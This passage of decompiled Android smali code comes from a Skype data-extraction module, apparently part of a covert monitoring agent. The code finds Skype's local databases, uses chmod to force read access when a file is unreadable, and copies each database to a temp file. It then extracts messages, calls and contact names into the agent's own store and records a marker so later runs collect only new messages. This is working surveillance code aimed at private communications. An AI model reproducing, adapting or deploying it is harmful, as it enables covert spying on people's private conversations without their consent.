    invoke-virtual {v6}, Ljava/lang/Long;->longValue()J

    move-result-wide v8

    invoke-direct {v7, v8, v9}, Ljava/sql/Date;-><init>(J)V

    iput-object v7, v3, Lcom/hp/vd/data/SkypeMessageData;->createdAt:Ljava/util/Date;

    .line 253
    iget-object v7, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->skypeMessageDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v7, v3}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_2

    :goto_8
    move-object v2, v6

    goto/16 :goto_0

    :catch_1
    move-exception v3

    .line 256
    :try_start_5
    iget-object v6, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v7, "SkypeExtractorV8"

    const-string v8, "extractMessagesAndCalls(): Exception caught while extracting a particular Message"

    invoke-interface {v6, v7, v8, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto/16 :goto_0

    .line 326
    :cond_d
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    if-eq v2, v0, :cond_e

    .line 333
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "v8_max_message_id"

    .line 334
    invoke-virtual {p0, v1, p2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 335
    invoke-virtual {v2}, Ljava/lang/Long;->toString()Ljava/lang/String;

    move-result-object v3

    .line 333
    invoke-virtual {p1, v1, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 338
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object p1

    invoke-virtual {p1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object p1

    .line 339
    iget-object v1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {p1, v1}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
    :try_end_5
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_2

    .line 355
    :cond_e
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "SkypeExtractorV8"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Skype(v8) Messages ("

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p2, ") successfully extracted. "

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string p2, " to: "

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, v1, p2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    :catch_2
    move-exception p1

    goto :goto_a

    .line 216
    :cond_f
    :goto_9
    :try_start_6
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "SkypeExtractorV8"

    const-string v2, "Cursor is NULL or count == 0. Exiting..."

    invoke-interface {p1, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_6
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_3

    return-void

    :catch_3
    move-exception p1

    move-object v2, v0

    .line 343
    :goto_a
    iget-object v1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "SkypeExtractorV8"

    const-string v4, "Error extracting data."

    invoke-interface {v1, v3, v4, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    if-eq v2, v0, :cond_10

    .line 346
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "v8_max_message_id"

    .line 347
    invoke-virtual {p0, v1, p2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    .line 348
    invoke-virtual {v0}, Ljava/lang/Long;->toString()Ljava/lang/String;

    move-result-object v0

    .line 346
    invoke-virtual {p1, p2, v0}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    :cond_10
    return-void
.end method

.method protected extractName(Lorg/w3c/dom/Document;I)Ljava/lang/String;
    .locals 2

    const-string v0, "unknown"

    const-string v1, "part"

    .line 362
    invoke-interface {p1, v1}, Lorg/w3c/dom/Document;->getElementsByTagName(Ljava/lang/String;)Lorg/w3c/dom/NodeList;

    move-result-object p1

    if-nez p1, :cond_0

    return-object v0

    .line 367
    :cond_0
    invoke-interface {p1, p2}, Lorg/w3c/dom/NodeList;->item(I)Lorg/w3c/dom/Node;

    move-result-object p1

    if-nez p1, :cond_1

    return-object v0

    .line 372
    :cond_1
    invoke-interface {p1}, Lorg/w3c/dom/Node;->getNodeType()S

    move-result p2

    const/4 v1, 0x1

    if-eq p2, v1, :cond_2

    return-object v0

    .line 376
    :cond_2
    check-cast p1, Lorg/w3c/dom/Element;

    const-string p2, "name"

    .line 377
    invoke-interface {p1, p2}, Lorg/w3c/dom/Element;->getElementsByTagName(Ljava/lang/String;)Lorg/w3c/dom/NodeList;

    move-result-object p1

    const/4 p2, 0x0

    invoke-interface {p1, p2}, Lorg/w3c/dom/NodeList;->item(I)Lorg/w3c/dom/Node;

    move-result-object p1

    if-nez p1, :cond_3

    return-object v0

    .line 382
    :cond_3
    invoke-interface {p1}, Lorg/w3c/dom/Node;->getTextContent()Ljava/lang/String;

    move-result-object p1

    if-eqz p1, :cond_4

    return-object p1

    :cond_4
    return-object v0
.end method

.method protected extractSkypeId(Lorg/w3c/dom/Document;I)Ljava/lang/String;
    .locals 2

    const-string v0, "unknown"

    const-string v1, "part"

    .line 394
    invoke-interface {p1, v1}, Lorg/w3c/dom/Document;->getElementsByTagName(Ljava/lang/String;)Lorg/w3c/dom/NodeList;

    move-result-object p1

    if-nez p1, :cond_0

    return-object v0

    .line 399
    :cond_0
    invoke-interface {p1, p2}, Lorg/w3c/dom/NodeList;->item(I)Lorg/w3c/dom/Node;

    move-result-object p1

    if-nez p1, :cond_1

    return-object v0

    .line 404
    :cond_1
    invoke-interface {p1}, Lorg/w3c/dom/Node;->getAttributes()Lorg/w3c/dom/NamedNodeMap;

    move-result-object p1

    const-string p2, "identity"

    invoke-interface {p1, p2}, Lorg/w3c/dom/NamedNodeMap;->getNamedItem(Ljava/lang/String;)Lorg/w3c/dom/Node;

    move-result-object p1

    invoke-interface {p1}, Lorg/w3c/dom/Node;->getTextContent()Ljava/lang/String;

    move-result-object p1

    if-eqz p1, :cond_2

    return-object p1

    :cond_2
    return-object v0
.end method

.method protected getDisplayName(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;
    .locals 6

    const/4 v0, 0x0

    :try_start_0
    const-string v1, "SELECT nsp_data FROM miniprofilecachev8 WHERE nsp_pk = ?"

    const/4 v2, 0x1

    .line 444
    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "C"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    aput-object p2, v2, v3

    invoke-virtual {p1, v1, v2}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1

    if-eqz p1, :cond_1

    .line 451
    invoke-interface {p1}, Landroid/database/Cursor;->getCount()I

    move-result p2

    if-nez p2, :cond_0

    goto :goto_0

    .line 457
    :cond_0
    invoke-interface {p1}, Landroid/database/Cursor;->moveToNext()Z

    const-string p2, "nsp_data"

    .line 458
    invoke-interface {p1, p2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result p2

    invoke-interface {p1, p2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object p1

    .line 460
    new-instance p2, Lorg/json/JSONObject;

    invoke-direct {p2, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string p1, "dn"

    .line 461
    invoke-virtual {p2, p1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 452
    :cond_1
    :goto_0
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string p2, "SkypeExtractorV8"

    const-string v1, "Cursor is NULL or count == 0. Exiting..."

    invoke-interface {p1, p2, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    move-exception p1

    .line 464
    iget-object p2, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "SkypeExtractorV8"

    const-string v2, "getDisplayName(): Exception caught"

    invoke-interface {p2, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-object v0
.end method

.method public isCompatible()Z
    .locals 1

    .line 476
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->detectDatabaseFiles()Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 478
    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x1

    return v0

    :cond_0
    const/4 v0, 0x0

    return v0
.end method

.method public isReadable(Ljava/lang/String;)Z
    .locals 1

    .line 587
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 589
    invoke-virtual {v0}, Ljava/io/File;->canRead()Z

    move-result p1

    return p1
.end method

.method protected parseProfileFromPath(Ljava/lang/String;)Ljava/lang/String;
    .locals 5

    const-string v0, "unknown"

    const-string v1, "live:"

    const-string v2, "s4l-live:"

    .line 521
    invoke-virtual {p1, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    add-int/lit8 v2, v2, 0x9

    const-string v3, "."

    .line 523
    invoke-virtual {p1, v3}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v4, -0x1

    if-eq v2, v4, :cond_1

    if-eq v3, v4, :cond_1

    if-gt v2, v3, :cond_1

    if-ne v2, v3, :cond_0

    goto :goto_0

    .line 530
    :cond_0
    :try_start_0
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v2, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    return-object p1

    :catch_0
    return-object v0

    :cond_1
    :goto_0
    return-object v0
.end method

.method public run()V
    .locals 9

    const-string v0, "SkypeTmpFile"

    .line 72
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V

    .line 78
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->detectDatabaseFiles()Ljava/util/List;

    move-result-object v0

    .line 85
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_0
    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_6

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    .line 91
    invoke-virtual {p0, v1}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->isReadable(Ljava/lang/String;)Z

    move-result v2

    const/4 v3, 0x3

    if-nez v2, :cond_1

    const/4 v2, 0x0

    .line 92
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {p0, v1, v2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z

    move-result v2

    if-nez v2, :cond_1

    .line 93
    iget-object v2, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "SkypeExtractorV8"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "chmod failed on (file): "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-interface {v2, v4, v5, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 101
    :cond_1
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 103
    invoke-virtual {v2}, Ljava/io/File;->isFile()Z

    move-result v4

    if-nez v4, :cond_2

    .line 104
    iget-object v2, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "SkypeExtractorV8"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Database file is not a file at:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v2, v4, v1, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto :goto_0

    .line 109
    :cond_2
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v4

    if-nez v4, :cond_3

    .line 110
    iget-object v1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "SkypeExtractorV8"

    const-string v4, "Database file does not exist."

    invoke-interface {v1, v2, v4, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto :goto_0

    .line 115
    :cond_3
    invoke-virtual {v2}, Ljava/io/File;->length()J

    move-result-wide v4

    const-wide/16 v6, 0x0

    cmp-long v8, v4, v6

    if-nez v8, :cond_4

    .line 116
    iget-object v1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "SkypeExtractorV8"

    const-string v4, "Database file is 0L long."

    invoke-interface {v1, v2, v4, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto :goto_0

    :cond_4
    :try_start_0
    const-string v4, "SkypeTmpFile"

    const-string v5, "db"

    .line 129
    iget-object v6, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->context:Lcom/hp/vd/context/Context;

    .line 132
    invoke-virtual {v6}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    invoke-virtual {v6}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v6

    invoke-virtual {v6}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v6

    .line 129
    invoke-static {v4, v5, v6}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v4

    .line 135
    invoke-virtual {p0, v2, v4}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->copy(Ljava/io/File;Ljava/io/File;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2

    .line 150
    :try_start_1
    invoke-virtual {v4}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    const/4 v5, 0x0

    const/16 v6, 0x10

    invoke-static {v2, v5, v6}, Landroid/database/sqlite/SQLiteDatabase;->openDatabase(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v2
    :try_end_1
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_1 .. :try_end_1} :catch_0

    .line 169
    invoke-virtual {p0, v1}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->parseProfileFromPath(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 171
    invoke-virtual {p0, v2, v1}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->extractMessagesAndCalls(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V

    if-eqz v2, :cond_5

    .line 174
    invoke-virtual {v2}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    :cond_5
    if-eqz v4, :cond_0

    .line 178
    invoke-virtual {v4}, Ljava/io/File;->delete()Z

    goto/16 :goto_0

    .line 153
    :catch_0
    iget-object v1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "SkypeExtractorV8"

    const-string v5, "Exception caught while opening database."

    invoke-interface {v1, v2, v5, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 156
    :try_start_2
    invoke-virtual {v4}, Ljava/io/File;->delete()Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto/16 :goto_0

    .line 159
    :catch_1
    iget-object v1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "SkypeExtractorV8"

    const-string v4, "Exception caught while trying to delete temporary database file."

    invoke-interface {v1, v2, v4, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto/16 :goto_0

    .line 138
    :catch_2
    iget-object v1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "SkypeExtractorV8"

    const-string v4, "Exception caught while copying temporary database"

    invoke-interface {v1, v2, v4, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto/16 :goto_0

    :cond_6
    return-void
.end method

.method protected safeExtractMaxId(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;)Ljava/lang/Long;
    .locals 2

    const-wide/16 v0, 0x0

    .line 487
    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    .line 488
    invoke-virtual {p1, p2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    if-nez p1, :cond_0

    .line 491
    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p1

    goto :goto_0

    .line 495
    :cond_0
    :try_start_0
    invoke-static {p1}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide p1

    invoke-static {p1, p2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 498
    :catch_0
    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p1

    :goto_0
    return-object p1
.end method
